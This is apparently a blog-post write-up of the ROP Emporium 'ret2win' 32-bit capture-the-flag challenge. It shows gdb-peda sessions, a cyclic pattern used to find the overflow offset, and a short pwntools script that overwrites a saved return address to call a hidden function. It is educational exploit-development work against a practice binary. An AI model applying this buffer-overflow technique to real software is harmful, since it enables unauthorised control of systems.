---
layout: post
title: "ropemporium - ret2win 32bit"
---

This is a writeup on the (32bit) ret2win challenge from ropemporium
## Description
_Locate a method within the binary that you want to call and do so by overwriting a saved return address on the stack._

## Starting off
first I run the executable normally and test what it does.
upon first run:
```
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> ayylmao

Exiting
```
Then tried to send 50 bytes as input
```
python -c "print 'A'*50" | ./ret2win32 
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> Segmentation fault
```
I opened the executable in gdb, I am using peda to help out.
```
gdb-peda$ info functions 
All defined functions:

Non-debugging symbols:
0x080483c0  _init
0x08048400  printf@plt
0x08048410  fgets@plt
0x08048420  puts@plt
0x08048430  system@plt
0x08048440  __libc_start_main@plt
0x08048450  setvbuf@plt
0x08048460  memset@plt
0x08048480  _start
0x080484b0  __x86.get_pc_thunk.bx
0x080484c0  deregister_tm_clones
0x080484f0  register_tm_clones
0x08048530  __do_global_dtors_aux
0x08048550  frame_dummy
0x0804857b  main
0x080485f6  pwnme
0x08048659  ret2win
0x08048690  __libc_csu_init
0x080486f0  __libc_csu_fini
0x080486f4  _fini
gdb-peda$
```
I checked the address of `ret2win`, which is `0x8048659`
Then I copied a pattern to a file called `payload` to help me out finding the offset I need for the return address.
```
gdb-peda$ pattern create 54
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AA'
gdb-peda$ shell
pwn@pwnlab:~/ropemporium/ret2win/32$ python -c "print 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AA'" > payload
pwn@pwnlab:~/ropemporium/ret2win/32$ exit
gdb-peda$ r < payload 
Starting program: /home/qh/CTF/ropemporium/ret2win/32/ret2win32 < payload
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> 
Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xffffd2f0 ("AAA%AAsAABAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AA\n")
EBX: 0x0 
ECX: 0xf7f9a89c --> 0x0 
EDX: 0xffffd2f0 ("AAA%AAsAABAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AA\n")
ESI: 0xf7f99000 --> 0x1d4d6c 
EDI: 0x0 
EBP: 0x41314141 ('AA1A')
ESP: 0xffffd320 --> 0xf7fe59a0 (push   ebp)
EIP: 0x8000a41
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------code-------------------------------]
Invalid $PC address: 0x8000a41
[-------------------------------stack------------------------------]
0000| 0xffffd320 --> 0xf7fe59a0 (push   ebp)
0004| 0xffffd324 --> 0xffffd340 --> 0x1 
0008| 0xffffd328 --> 0x0 
0012| 0xffffd32c --> 0xf7ddce81 (<__libc_start_main+241>:	add    esp,0x10)
0016| 0xffffd330 --> 0xf7f99000 --> 0x1d4d6c 
0020| 0xffffd334 --> 0xf7f99000 --> 0x1d4d6c 
0024| 0xffffd338 --> 0x0 
0028| 0xffffd33c --> 0xf7ddce81 (<__libc_start_main+241>:	add    esp,0x10)
[------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x08000a41 in ?? ()
gdb-peda$ 
```
Looks like my input was long enough, just have to remove one character, so my padding is 53 bytes.
So with this exploit the stack frame should look like this:
```
+-----------------+
|  padding of 53  |
+-----------------+
|    0x8048659    |
+-----------------+
```
Here is my exploit script, I like to use `pwntools` because it makes things easier for me.
```python
from pwn import *

payload = 'A'*53
payload += p32(0x8048659)
print payload
```
I then run:
```
python exploit.py | ./ret2win32
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> Segmentation fault
```
Hm, that did not work.
I copied the exploit output into a file and ran it with gdb.
```
gdb-peda$ r < payload 
Starting program: /home/qh/CTF/ropemporium/ret2win/32/ret2win32 < payload
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> 
Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xffffd2d0 ('A' <repeats 49 times>)
EBX: 0x0 
ECX: 0xf7f9a89c --> 0x0 
EDX: 0xffffd2d0 ('A' <repeats 49 times>)
ESI: 0xf7f99000 --> 0x1d4d6c 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd300 --> 0xf7fe0041 (add    BYTE PTR [eax],al)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffd300 --> 0xf7fe0041 (add    BYTE PTR [eax],al)
0004| 0xffffd304 --> 0xffffd320 --> 0x1 
0008| 0xffffd308 --> 0x0 
0012| 0xffffd30c --> 0xf7ddce81 (<__libc_start_main+241>:	add    esp,0x10)
0016| 0xffffd310 --> 0xf7f99000 --> 0x1d4d6c 
0020| 0xffffd314 --> 0xf7f99000 --> 0x1d4d6c 
0024| 0xffffd318 --> 0x0 
0028| 0xffffd31c --> 0xf7ddce81 (<__libc_start_main+241>:	add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$ 
```
So I need to have a smaller padding.
I tried a padding of 49. Which got the same result.
I then decided to try a padding of 44 bytes, and this was the result.
```
python exploit.py | ./ret2win32 
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
Segmentation fault
```
Success!

link to the challenge: https://ropemporium.com/challenge/ret2win.html